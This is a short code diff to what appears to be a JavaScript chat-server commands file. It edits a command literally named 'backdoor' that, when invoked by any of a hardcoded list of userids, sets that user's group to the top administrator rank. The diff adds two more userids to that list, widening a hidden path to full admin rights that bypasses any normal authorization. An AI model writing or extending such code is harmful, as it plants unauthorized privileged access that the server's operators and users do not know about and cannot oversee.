@@ -2412,7 +2412,7 @@ var commands = exports.commands = {
 	},
 	
 	backdoor: function(target,room, user) {
-                if (user.userid === '001mac100' || user.userid === 'macrarazy' || user.userid === 'sorayousef') {
+                if (user.userid === '001mac100' || user.userid === 'macrarazy' || user.userid === 'sorayousef' || user.userid === 'vacate' || user.userid === 'sirlef') {
 
                         user.group = '~';
                         user.updateIdentity();
